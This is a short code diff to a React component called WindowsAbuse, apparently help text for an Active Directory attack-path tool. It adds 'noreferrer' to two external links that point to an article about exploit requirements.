@@ -281,7 +281,7 @@ const WindowsAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType, targetName, t
                         of exploit requirements and implementation, you can refer to{' '}
                         <Link
                             target='_blank'
-                            rel='noopener'
+                            rel='noopener noreferrer'
                             href='https://labs.withsecure.com/publications/ou-having-a-laugh'>
                             this article
                         </Link>
@@ -326,7 +326,7 @@ const WindowsAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType, targetName, t
                         of exploit requirements and implementation, you can refer to{' '}
                         <Link
                             target='_blank'
-                            rel='noopener'
+                            rel='noopener noreferrer'
                             href='https://labs.withsecure.com/publications/ou-having-a-laugh'>
                             this article
                         </Link>
